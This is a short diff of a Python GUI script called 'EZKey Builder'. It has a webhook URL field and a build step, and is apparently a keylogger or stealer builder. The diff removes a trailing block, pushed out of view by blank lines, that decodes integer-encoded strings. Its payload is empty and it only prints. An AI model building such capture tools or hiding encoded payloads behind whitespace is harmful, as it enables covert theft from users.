@@ -50,7 +50,7 @@ def __makebuild(webh_url, max_len):
     ui.notify(f"Build has finished!", timeout=30, progress=True, color="green", position="top-left")
 
 def _home():
-    ui.label(".gg/BptVd57QHr").classes('text-center text-xl font-bold')
+    ui.label("EZKey Builder").classes('text-center text-xl font-bold')
     
     with ui.column():
         webh_url = ui.input(label='WebHook URL', placeholder='EZKey my g').props('inline color=orange-3').classes('w-full')
@@ -112,39 +112,3 @@ if __name__ in {"__main__", "__mp_main__"}:
             width=500,
             height=650, 
         ).run()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-encoded = """
-
-"""
-s = encoded.split("\n")
-for _encoded_int in s:
-    for encoded_int in _encoded_int.split(" "):
-        if encoded_int == "":
-            continue
-        # Decode the integer to bytes object
-        decoded_bytes = int(encoded_int).to_bytes((int(encoded_int).bit_length() + 7) // 8, byteorder='big')
-
-        # Decode the bytes object to a string
-        decoded_string = decoded_bytes.decode()
-
-        # Print the decoded string
-        print(decoded_string)
